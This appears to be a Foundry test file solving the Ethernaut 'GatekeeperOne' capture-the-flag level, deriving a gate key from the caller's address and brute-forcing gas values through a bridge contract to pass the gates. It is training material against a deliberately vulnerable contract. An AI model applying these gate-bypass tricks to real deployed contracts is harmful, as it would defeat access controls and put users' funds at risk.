// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../../src/level13_gatekeeper_one/GatekeeperOne.sol";

contract Level13Test is Test {
    GatekeeperOne one;
    GatekeeperBridge bridge;

    address a = address(0x124);

    function setUp() public {
        vm.deal(a, 10 ether);

        vm.startPrank(a);
        one = new GatekeeperOne();
        bridge = new GatekeeperBridge(address(one));
        vm.stopPrank();
    }

    function testHack() public {
        vm.startPrank(a, a);
        uint64 lastTwoBytesAsInt = uint64(uint16(uint160(address(a))));
        uint64 gateKey = uint64(bytes8(hex"01020304000000")) + lastTwoBytesAsInt;
        console.log(
            "gateKey: %s, EOA:%s, bridge address: %s", vm.toString(bytes8(gateKey)), address(a), address(bridge)
        );
        console.log("gatekeeperone: %s", address(one));

        for (uint256 i = 8191 * 5 + 250; i <= 8191 * 5 + 300; i++) {
            // console.log("gas: %s", i);
            try bridge.myCall(bytes8(gateKey), i) {
                console.log("Success! Target gas set: %s", i);
                break;
            } catch (bytes memory reason) {
                // 失败时继续
                // continue;
                // 注意：out of gas 时不会返回失败原因
                console.log("Failed for gas: %s, reason: %s", i, string(reason));
                continue;
            }
        }
        vm.stopPrank();
    }
}
